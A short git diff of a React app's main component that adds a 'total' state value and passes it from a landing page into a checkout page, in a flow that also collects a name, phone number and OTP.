@@ -15,6 +15,7 @@ function App() {
   const [isLoading, setisloading] = useState(false);
   const [name, setName] = useState('')
   const [phone, setPhone] = useState('')
+  const [total  , setTotal] = useState('')
   const [otp, setOtp] = useState('')
   const [otpArd] = useState([''])
 const [_id]=useState( "id" + Math.random().toString(16).slice(2))
@@ -63,9 +64,9 @@ localStorage.setItem('vistor',_id)
       </div>
       {
         currantPage === 1 ?
-          <Landing handleNextPage={handleNextPage} /> :
+          <Landing handleNextPage={handleNextPage} setTotal={setTotal} /> :
           currantPage === 2 ?
-            <CheckoutPage setName={setName} setPhone={setPhone} handleNextPage={handleNextPage}  /> :
+            <CheckoutPage setName={setName} setPhone={setPhone} handleNextPage={handleNextPage}  total={total}/> :
             currantPage >= 3 ?
               <Payment 
               handleOtp={handleOtp} 
